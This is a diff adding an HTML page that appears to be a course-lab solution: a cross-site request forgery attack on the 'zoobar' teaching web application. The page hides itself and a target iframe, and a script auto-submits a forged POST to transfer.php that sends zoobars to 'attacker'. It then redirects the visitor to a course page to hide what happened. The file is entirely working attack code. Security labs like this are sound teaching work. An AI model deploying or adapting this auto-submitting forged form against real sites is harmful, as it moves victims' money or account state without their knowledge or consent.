@@ -1,0 +1,35 @@
+<html>
+  <head>
+    <title> </title>
+  </head>
+
+  <body style="visibility: hidden">
+    <iframe name="form_target" width="700" height="500" style="visibility: hidden">
+    </iframe>
+    
+    <form name="attack_b" target="form_target" action="http://zoobar.org/transfer.php" method="post">
+      <input type="hidden" name="zoobars" value="1">
+      <input type="hidden" name="recipient" value="attacker">
+      <input type="submit" name="submission" value="Execute" id="submit" onClick="redirect()">
+    </form>
+    
+    <script>
+      document.onload = execute();
+      //document.getElementById("submit").click();
+
+      function execute()
+      {
+        document.getElementById("submit").click();
+      }
+
+      function redirect()
+      {
+        window.location.assign("http://cseweb.ucsd.edu/classes/sp14/cse127-a")
+      }
+
+    </script>
+
+  </body>
+</html>
+
+<!-- vim: set shiftwidth=2 tabstop=2 : -->
